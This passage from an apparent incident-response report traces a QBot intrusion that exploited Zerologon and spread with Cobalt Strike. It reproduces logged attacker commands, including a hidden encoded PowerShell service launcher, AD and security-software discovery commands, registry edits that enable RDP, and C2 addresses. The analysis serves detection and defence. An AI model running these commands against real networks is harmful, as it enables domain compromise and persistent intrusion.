a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.”\n\nAs we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller:\n\n```image\nAlt: Brute Force\nDescription: The image depicts network traffic logs related to the RPC_NETLOGON protocol. It shows multiple entries for authentication requests and responses, particularly noting 'STATUS_ACCESS_DENIED' for several attempts, indicating failed authentication attempts. Some lines highlight issues such as 'TCP Spurious Retransmission' and 'TCP Previous segment not captured,' which suggest network anomalies. The overall context is related to a brute-force attack scenario where access to the Domain Controller is being attempted.\nTranscription: |\n  Protocol          Info\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Spurious Retransmission] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Previous segment not captured] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n```\n\nAfter the end of the brute force traffic, we can see a single instance where the exploit has completed successfully.\n\n```image\nAlt: Exploit Success\nDescription: The image displays a network packet capture from a cybersecurity analysis tool. It shows a single frame containing detailed information about a malformed packet related to the Microsoft Network Logon protocol. Key aspects include the Ethernet II source and destination ports, the operation type (NetrServerPasswordSet2), and the timestamp, which appears incorrectly set to 'Dec 31, 1969'. The report also highlights an error indicating a malformed packet, with an associated error level marked as 'Error' and a severity level of 'Error', suggesting that there was an exception during packet processing.\nTranscription: |\n  Frame 938101: 94 bytes on wire (752 bits), 94 bytes captured (752 bits)\n  Ethernet II, Src:\n  Internet Protocol\n  Transmission Control Protocol, Src Port: 49675, Dst Port: 61579, Ack: 41675, Len: 40\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Response, Fragment: Single, FragLen: 40, Call: 548, Ctx: 0, [Req: #938017]\n  Microsoft Network Logon, NetrServerPasswordSet2 (30)\n      Request in frame: 938017\n      AUTHENTICATOR: return_authenticator\n          Referent ID: 0xdd55e901\n          Credential: 080ade8600000000\n          Timestamp: (0)Dec 31, 1969 19:00:00.000000000 EST\n  [Malformed Packet: RPC_NETLOGON]\n      [Expert Info (Error/Malformed): Malformed Packet (Exception occurred)]\n      [Malformed Packet (Exception occurred)]\n      [Severity level: Error]\n      [Group: Malformed]\n```\n\nAfter being successfully authenticated, the DC password was set:\n\n```image\nAlt: DC Password\nDescription: The image is a screenshot of an XML log entry from Microsoft Windows security auditing. It contains detailed information about a security event identified by Event ID 4742, which indicates that a computer account was changed. Key data points include the target username, target domain name, subject username ('ANONYMOUS LOGON'), and the timestamp of the event. The XML structure delineates various attributes associated with the event, providing a technical overview of the changes made to the computer account.\nTranscription: |\n  <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n    <System>\n      <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-a5ba-3e3b0328c30d}\"/>\n      <EventID>4742</EventID>\n      <Version>0</Version>\n      <Level>0</Level>\n      <Task>13825</Task>\n      <Opcode>0</Opcode>\n      <Keywords>0x8020000000000000</Keywords>\n      <TimeCreated SystemTime=\"T17:03:25.2463168Z\"/>\n      <EventRecordID>13249</EventRecordID>\n      <Execution ProcessID=\"644\" ThreadID=\"224\"/>\n      <Channel>Security</Channel>\n      <Computer>...</Computer>\n    </System>\n    <EventData>\n      <Data Name=\"ComputerAccountChange\">...</Data>\n      <Data Name=\"TargetUserName\">...</Data>\n      <Data Name=\"TargetDomainName\">...</Data>\n      <Data Name=\"TargetSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserName\">ANONYMOUS LOGON</Data>\n      <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\n      <Data Name=\"PrivilegeList\">...</Data>\n      <Data Name=\"SubjectLogonId\">0x3e6</Data>\n      <Data Name=\"SamAccountName\">...</Data>\n      <Data Name=\"DisplayName\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"HomePath\">...</Data>\n      <Data Name=\"ScriptPath\">...</Data>\n      <Data Name=\"ProfilePath\">...</Data>\n      <Data Name=\"UserWorkstations\">...</Data>\n      <Data Name=\"PasswordLastSet\">5:03:25 PM</Data>\n      <Data Name=\"UserAccountExpires\">...</Data>\n      <Data Name=\"PrimaryGroupId\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"OldValue\">...</Data>\n      <Data Name=\"UserAccountControl\">...</Data>\n      <Data Name=\"SidHistory\">...</Data>\n      <Data Name=\"LogonHours\">...</Data>\n      <Data Name=\"DnsHostName\">...</Data>\n      <Data Name=\"ServicePrincipalNames\">...</Data>\n    </EventData>\n  </Event>\n```\n\nThe `PasswordLastSet` field is equal to the `TimeCreated` field, meaning that the password of the domain controller was successfully updated. We can also see that the `SubjectUserName` is `ANONYMOUS LOGON`.\n\nA connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\n\n```image\nAlt: Domain Admin Hash\nDescription: The image displays a Windows Event Log entry (Event 7045) from the Service Control Manager. It provides details about a service that was installed on the system. The log includes the following key information: the service name 'LMMCP00MEDEFHBDAMBML', the service file name which is a PowerShell command to reset the computer's machine password, the service type classified as a user mode service, the service start type labeled as 'demand start', and the service account specified as 'LocalSystem'. This information is relevant for analyzing potential unauthorized service installations and security breaches.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: LMMCPOOMEDEFHBDAAMBML\n  Service File Name: powershell.exe -c Reset-ComputerMachinePassword\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nThe explorer shell was also restarted by the threat actor:\n\n```image\nAlt: Explorer Restart\nDescription: The image displays a Windows Event Viewer screenshot showing Event ID 7045, which indicates that a new service was installed on the system. It includes details such as the service name (ANFDHCOCLIICFDIPINAD), the service file name (a command to execute ‘taskkill’), the service type (user mode service), the start type (demand start), and the service account (LocalSystem). This information is relevant in the context of monitoring system changes and potential malicious activities.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  A service was installed in the system.\n  Service Name: ANFDHCOCLIICFDIPINAD\n  Service File Name: %COMSPEC% /C \"taskkill /f /im explorer.exe\"\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\n### Defense Evasion\n\nUpon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\n\n```image\nAlt: Process Hollowing\nDescription: The image displays a log entry related to a security event in a Windows environment. It includes various fields such as LogName, EventCode, EventType, ComputerName, SourceName, and details about the process creation event. Key information includes the Creator Subject's Security ID and Logon ID, the Target Subject's Security ID, and the Process Information detailing the New Process ID, New Process Name, and Command Line. This log entry specifically indicates that a new process has been created, providing insight into potential suspicious activity related to process creation.\nTranscription: |\n  LogName=Security\n  EventCode=4688\n  EventType=0\n  ComputerName=\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=38250\n  Keywords=Audit Success\n  TaskCategory=Process Creation\n  OpCode=Info\n  Message=A new process has been created.\n  \n  Creator Subject:\n      Security ID:\n      Account Name:\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name: -\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1958\n      New Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Token Elevation Type: %%1936\n      Mandatory Label: S-1-16-8192\n      Creator Process ID: 0x32b4\n      Creator Process Name: C:\\Windows\\SysWOW64\\rundll32.exe\n      Process Command Line: C:\\Windows\\SysWOW64\\explorer.exe\n```\n\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.\n\n```image\nAlt: Cobalt Strike Communication\nDescription: The image displays a log entry from the Microsoft Windows Sysmon (System Monitor) detailing a process access event. It includes various information fields such as EventCode, EventType, ComputerName, and specifics about the Source and Target processes involved in a Dynamic-link Library (DLL) injection technique. Key details highlighted include SourceProcessId (10492) and TargetProcessId (4072), both referencing instances of explorer.exe. The log also mentions the technique ID (T1055.001), indicating that this relates to process injection methods, which is relevant to cyber threat intelligence.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=10\n  EventType=4\n  ComputerName=DESKTOP-XXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=38015\n  Keywords=None\n  TaskCategory=Process accessed (rule: ProcessAccess)\n  OpCode=Info\n  Message=Process accessed:\n  RuleName: technique_id=T1055.001, technique_name=Dynamic-link Library Injection\n  UtcTime: [REDACTED]\n  SourceProcessGUID: {6634681a-8d6d-6192-3312-000000000500}\n  SourceProcessId: 10492\n  SourceThreadId: 11956\n  SourceImage: C:\\Windows\\SysWOW64\\explorer.exe\n  TargetProcessGUID: {6634681a-9429-6192-c412-000000000500}\n  TargetProcessId: 4072\n  TargetImage: C:\\Windows\\SysWOW64\\explorer.exe\n  GrantedAccess: 0x1FFFFF\n```\n\n#### Over-Pass-the-Hash from Beachhead\n\nThe threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.\n\n```image\nAlt: Over-Pass-the-Hash\nDescription: The image displays the properties of a security event (Event ID 4624) from a Microsoft Windows security auditing log. It details a successful logon event, including information such as the Security ID, Account Name, Logon Type, and Process Information. The log outlines the account that was logged on, the associated security identifiers, and details about the logon process, including the source address and the authentication package used.\nTranscription: |\n  Event Properties - Event 4624, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39D591C\n  \n  Logon Information:\n    Logon Type: 9\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: No\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39E88DB\n    Linked Logon ID: 0x0\n    Network Account Name: Administrator\n    Network Account Domain:\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0xaf4\n    Process Name: C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n    Workstation Name:\n    Source Network Address: ::1\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: seclog\n    Authentication Package: Negotiate\n    Transited Services:\n    Package Name (NTLM only): -\n    Key Length: 0\n```\n\nSoon after, a TGT for the administrator account was requested:\n\n```image\nAlt: TGT Request\nDescription: The image displays a screenshot of the Event Properties for Event ID 4768, indicating a request for a Kerberos authentication ticket (TGT). It contains detailed information about the account making the request (Administrator), the service involved (krbtgt), and the associated network information including client address and port. Additional details on ticket options, result code, ticket encryption type, and pre-authentication type are also provided, making it a relevant and informative resource for analyzing authentication requests in a cybersecurity context.\nTranscription: |\n  Event Properties - Event 4768, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  A Kerberos authentication ticket (TGT) was requested.\n  \n  Account Information:\n  - Account Name: Administrator\n  - Supplied Realm Name:\n  - User ID: S-1-5-21-853439379-3680187918-914098032-500\n  \n  Service Information:\n  - Service Name: krbtgt\n  - Service ID: S-1-5-21-853439379-3680187918-914098032-502\n  \n  Network Information:\n  - Client Address: :::ffff:10.155.25.134\n  - Client Port: 61689\n  \n  Additional Information:\n  - Ticket Options: 0x40810010\n  - Result Code: 0x0\n  - Ticket Encryption Type: 0x12\n  - Pre-Authentication Type: 2\n  \n  Certificate Information:\n  - Certificate Issuer Name:\n  - Certificate Serial Number:\n  - Certificate Thumbprint:\n  \n  Certificate information is only provided if a certificate was used for pre-authentication.\n  Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.\n```\n\n### Discovery\n\nQBot initially starts a number of processes to collect information about the affected system. This is part of the “SYSTEM INFO” bot request, as described in a recent article from SecureList.\n\n```image\nAlt: System Info\nDescription: The image displays a table containing data related to system commands executed during a cybersecurity event. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory,' listing various commands such as 'whoami /all,' 'ipconfig /all,' and 'nslookup.' Each command is associated with the 'explorer.exe' process, indicating that these commands are part of the discovery phase in a potential attack, reflecting the operational tactics used to gather information about the affected system and network.\nTranscription: |\n  | ParentImage         | CommandLine                                              | TaskCategory                         |\n  | ------------------- | -------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64 | whoami /all                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | cmd /c set                                               | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | ipconfig /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net view /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdc. | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net share                                                | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | route print                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | netstat -nao                                             | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net localgroup                                           | Process Create (rule: ProcessCreate) |\n```\n\nLater, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\n\n```image\nAlt: Active Directory Discovery\nDescription: The image depicts a table detailing command-line activities related to process creation on a Windows system. It includes columns for 'ParentImage', 'CommandLine', and 'TaskCategory', showing various commands executed, such as retrieving group information from a domain and executing a ping command. This information is relevant for understanding the investigative steps taken during a cybersecurity incident involving QBot.\nTranscription: |\n  | ParentImage                      | CommandLine                                                                               | TaskCategory                         |\n  | -------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain admins\" /domain                                                         | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain controllers\" /domain                                                    | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C ping -n 1                                                  | Process Create (rule: ProcessCreate) |\n```\n\n#### ADFind (renamed in find.exe) used to enumerate computers\n\n```\nC:\\redacted\\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\n```image\nAlt: ADFind\nDescription: The image displays technical information about the tool 'find.exe', which is known as AdFind. It includes details such as the file version (1.52.0.5064), product name (AdFind), company (www.joeware.net), original file name (AdFind.exe), and the command line used to execute the tool. The command line demonstrates how the tool is utilized to enumerate computer objects in an Active Directory environment, specifically fetching attributes like name, common name (cn), operating system, and DNS host name in CSV format.\nTranscription: |\n  Image:                find.exe\n  FileVersion:          1.52.0.5064\n  Description:          -\n  Product:              AdFind\n  Company:              www.joeware.net\n  OriginalFileName:     AdFind.exe\n  CommandLine:          C:\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\nOn the Domain Controller, the threat actors gathered information about the installed security software through WMI:\n\n```image\nAlt: WMI Query\nDescription: The image displays a table containing process creation logs related to a Windows environment. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory.' The 'ParentImage' column indicates the use of PowerShell, while the 'CommandLine' column shows various commands executed via cmd.exe to query security software components using Windows Management Instrumentation (WMI). The 'TaskCategory' column specifies that these actions are categorized as 'Process Create.' This data is relevant for understanding the actions taken by threat actors during a domain compromise.\nTranscription: |\n  | ParentImage                                               | CommandLine                                                                                              | TaskCategory                         |\n  | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value   | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value    | Process Create (rule: ProcessCreate) |\n```\n\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value\n```\n\n#### Ping was used to verify machines were online\n\n```\nping -n 1 [REDACTED]\n```\n\n### Lateral Movement\n\nThrough the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.\n\n```\nEventCode: 7045\nService File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted>\nUser: NT AUTHORITY\\SYSTEM\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\n```\n\nOn the first Domain Controller, a Cobalt Strike service was installed:\n\n```image\nAlt: Cobalt Strike Service\nDescription: The image displays a Windows Event Log entry with details about a service installation related to a Cobalt Strike operation. Key information includes the EventCode (7045), indicating a service was installed, the Service File Name which shows the command executed (including PowerShell and an encoded command), the User account under which the service was created (LocalSystem), and other attributes like the ComputerName and types of the service. This log entry is crucial for understanding the lateral movement of malware in a network.\nTranscription: |\n  LogName: System\n  EventCode: 7045\n  EventType: 4\n  ComputerName: <redacted>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-Service Control Manager\n  Type: Information\n  RecordNumber: 2730\n  TaskCategory: None\n  OpCode: The operation completed successfully.\n  Message: A service was installed in the system.\n  \n  Service Name: af5ff02\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADOATgB1AHcALQBpAGMAdABlAG8AQgB5AFMAZABhAGUAYQBuAGQAYQAgAGUAbgB0AGUAcgB0AGUAcgB0AGUAcgB0AGUAcgB...\n```\n\n```\nLog Source: Microsoft-Windows-Service Control Manager Event ID:7045\n```\n\nMultiple services were installed by Cobalt Strike across the environment, here are a few examples:\n\n```\nHKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath\n```\n\nCobalt Strike first calls `OpenSCManagerW` to create the service remotely, then starts it with `StartServiceA` function:\n\n```image\nAlt: Service Creation\nDescription: The image displays a network packet capture related to the execution of the `OpenSCManagerW` and `StartServiceA` functions, which are part of the Cobalt Strike malware's lateral movement technique. The upper part shows timestamps, source, and destination ports, indicating communication between a compromised host and a domain controller. The lower part provides detailed information about the captured frame, including frame size, Ethernet II details, and the Internet Protocol version 4 data. This image contains technical details pertinent to cyber threat analysis.\nTranscription: |\n  Frame 1306464: 194 bytes on wire (1552 bits), 194 bytes captured (1552 bits)\n  Ethernet II, Src: <redacted>, Dst: <redacted>\n  Internet Protocol Version 4, Src: BeachHead IP, Dst: DC IP\n  Transmission Control Protocol, Src Port: 61768, Dst Port: 49729, Seq: 14613, Ack: 679, Len: 140\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Request, Fragment: Single, Fragment Offset: 0\n  ```\n  \n  ```\n  17:15:47.907308 61768 SVCCtl OpenSCManagerW request\n  17:15:47.908686 49729 SVCCtl OpenSCManagerW response\n  17:15:47.914445 49729 SVCCtl Unknown operation 60 response\n  17:15:47.915546 61768 SVCCtl StartServiceA request\n  17:15:48.031885 49729 SVCCtl StartServiceA response\n```\n\n#### RDP/interactive Logins\n\nVarious commands were executed to enable the RDP service on various hosts:\n\nIncrease the max RDP connections allowed, in this case a arbitrarily large number.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f\n```\n\nMakes sure the RDP listener is enabled.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f\n```\n\nMakes sure the user is allowed to RDP to the terminal server.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f\n```\n\nMakes sure the terminal server is set to enabled.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f\n```\n\nMakes sure terminal services is set to remote admin mode.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f\n```\n\nMakes sure that the terminal service will start idle sessions.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f\n```\n\nEnables advertisement of the terminal server.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f\n```\n\nMakes sure terminal server is set to allow connections.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f\n```\n\nMakes sure terminal server is set to simultaneous sessions.\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f\n```\n\nStarts the terminal services and sets service to autostart.\n\n```\nsc config termservice start= auto\nnet  start termservice /y\n```\n\nThe threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.\n\n```image\nAlt: RDP Sessions\nDescription: The image displays a detailed security log entry from a Windows environment, indicating a successful logon event (EventCode=4624) related to Remote Desktop Protocol (RDP). It includes specific logon information such as the security ID, account name, account domain, logon type, and process information. The log indicates that an account was successfully logged on, with notable details about the administrator account used, including its security ID, logon ID, and the process associated with the logon (svchost.exe). This log serves as a crucial piece of information in the context of lateral movement and potential domain compromise scenarios.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=************\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=12572\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID: S-1-5-18\n      Account Name: ************\n      Account Domain: ************\n      Logon ID: 0x3E7\n  \n  Logon Information:\n      Logon Type: 10\n      Restricted Admin Mode: No\n      Virtual Account: No\n      Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n      Security ID: S-1-5-21-853439379-3680187918-914908032-500\n      Account Name: Administrator\n      Account Domain: ************\n      Logon ID: 0x1213E97\n      Linked Logon ID: 0x0\n      Network Account Name: -\n      Network Account Domain: -\n      Logon GUID: {56eb6b07-4091-d736-d28e-f8ef8d0dc9158}\n  \n  Process Information:\n      Process ID: 0x3c\n      Process Name: C:\\Windows\\System32\\svchost.exe\n```\n\n```\nLogName=Security\nEventCode=4624\nLogon Type=10 (Remote Interactive Logon - RDP)\n```\n\n### Named pipe (SMB)\n\nThe base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe “dce_3d”.\n\n```image\nAlt: SMB Beacon\nDescription: The image shows the output of a CyberChef operation, displaying a base64 decoded payload. The highlighted portion indicates the creation of a named pipe named \"dce_3d\". The surrounding text contains garbled data, typical of decoded binary payloads, potentially representing an SMB beacon.\nTranscription: |\n  üè....`à1òd.R0.R..R.r( .J&1y1A¬<a|, ÁÏ\n  ,ÇàRW.R..B<.D.@x.AtJ.DP.H..X .óá<1.4..Ó1y1¬ÁÍ\n  .Cçàu0.j; }$uÀ.xS.6f.K.x..ó...D.$$$[[ayZQyàX_Z..ë.1]Àj@h....hyÿ..j.hX¤SâyÖPé´...z1éQqh.°..h..°j.j.RhEpÔyÖP..$i.Rh(o)áyÖ.Atnj.j.j..æ.Æ..Â.|$..9At.hòµçVyÖyd$.èsyÿ\\\\.\\pipe\\dce_3d .i .\n```\n\n```image\nAlt: Named Pipe\nDescription: The image displays a log entry related to the creation of a named pipe in a Windows environment. It contains various fields such as LogName, EventCode, ComputerName, User, and more, with specific values indicating the details of the event. Notably, it shows that a pipe named '\\dce_3d' was created by a process with ID 396, which is associated with PowerShell. The log entry format is typical for Windows event logs, providing crucial information for cybersecurity analysis.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=17\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=43747\n  Keywords=None\n  TaskCategory=Pipe Created (rule: PipeEvent)\n  OpCode=Info\n  Message=Pipe Created:\n  RuleName=-\n  EventType=CreatePipe\n  UtcTime=\n  ProcessGuid={3acf9a2a-953e-6192-cd20-00000000000300}\n  ProcessId=396\n  PipeName=\\dce_3d\n  Image: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n```\nLogName=Microsoft-Windows-System/Operational\nEventCode=17\nTaskCategory=Pipe Created (rule: PipeEvent)\n```\n\n### Command and Control\n\n#### QBot details – 24.229.150.54 // 41.228.22.180\n\n24.229.150[.]54:995 / avlhestito[.]us\n\n```\nCertificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce\nNot Before  2021/11/15 09:24:49 UTC\nNot After  2022/11/15 13:18:32 UTC\nIssuer Org  Rsc Inpye LLC.\nSubject Common  avlhestito[.]us\nPublic Algorithm  rsaEncryption\nJA3: 